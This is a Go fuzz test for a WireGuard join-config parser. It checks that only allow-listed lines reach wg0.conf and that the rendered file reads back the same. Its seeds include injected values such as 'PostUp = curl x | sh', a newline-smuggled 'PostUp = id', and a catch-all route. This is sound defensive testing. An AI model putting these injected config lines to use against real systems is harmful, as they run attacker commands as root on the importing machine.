package wireguard

import (
	"regexp"
	"strings"
	"testing"
)

// peerLine is every line renderPeerConfig may write into wg0.conf. wg-quick
// runs PreUp/PostUp/PreDown/PostDown as root shell commands, and Table or
// FwMark change the routing; none of them may come out of a join file.
var peerLine = regexp.MustCompile(`^(?:#[^\n]*|\[Interface\]|\[Peer\]|` +
	`PrivateKey = [A-Za-z0-9+/]{43}=|PublicKey = [A-Za-z0-9+/]{43}=|PresharedKey = [A-Za-z0-9+/]{43}=|` +
	`Address = [0-9.]+/32|MTU = [0-9]{4}|Endpoint = [A-Za-z0-9.:\[\]-]+|` +
	`AllowedIPs = [0-9./, ]+|PersistentKeepalive = [0-9]{1,5})$`)

const (
	fuzzPriv = "eL0jO0wH0p2vx1v3ZpDqVnN3q7l0bW1yJwqGqG7m8Xo="
	fuzzPub  = "Q2XyT3hZx0oN2j3w2bq9HqFvCq7m3m1ZrD4dGkY0hWA="
)

const fuzzGoodJoin = "[Interface]\nPrivateKey = " + fuzzPriv + "\nAddress = 10.8.0.2/32\nDNS = 10.8.0.1\n\n[Peer]\nPublicKey = " + fuzzPub +
	"\nEndpoint = vpn.example.com:51820\nAllowedIPs = 10.8.0.0/24\nPersistentKeepalive = 25\n"

// The fuzzer starts from a file that passes, so it explores the accepted
// side of the parser and not only rejections.
func TestFuzzJoinSeedIsValid(t *testing.T) {
	if _, _, err := parseJoinConfig(fuzzGoodJoin); err != nil {
		t.Fatal(err)
	}
}

func FuzzJoinConfig(f *testing.F) {
	good := fuzzGoodJoin
	f.Add(good)
	f.Add(JoinCode(good))
	f.Add(strings.Replace(good, "DNS = 10.8.0.1", "PostUp = curl x | sh", 1))
	f.Add(strings.Replace(good, "vpn.example.com:51820", "vpn.example.com:51820\nPostUp = id", 1))
	f.Add(strings.Replace(good, "10.8.0.0/24", "0.0.0.0/0", 1))
	f.Add(strings.Replace(good, "[Peer]", "[Peer]\nTable = off", 1))
	f.Fuzz(func(t *testing.T, input string) {
		content, err := decodeJoinInput(input)
		if err != nil {
			return
		}
		jc, _, err := parseJoinConfig(content)
		if err != nil {
			return
		}
		out := renderPeerConfig(jc)
		for _, line := range strings.Split(strings.TrimSpace(out), "\n") {
			if line != "" && !peerLine.MatchString(line) {
				t.Fatalf("unexpected wg0.conf line %q", line)
			}
		}
		// The written file must read back as the same configuration.
		again, _, err := parseJoinConfig(out)
		if err != nil {
			t.Fatalf("rendered wg0.conf rejected: %v\n%s", err, out)
		}
		if renderPeerConfig(again) != out {
			t.Fatalf("not stable:\n%s\n---\n%s", out, renderPeerConfig(again))
		}
	})
}
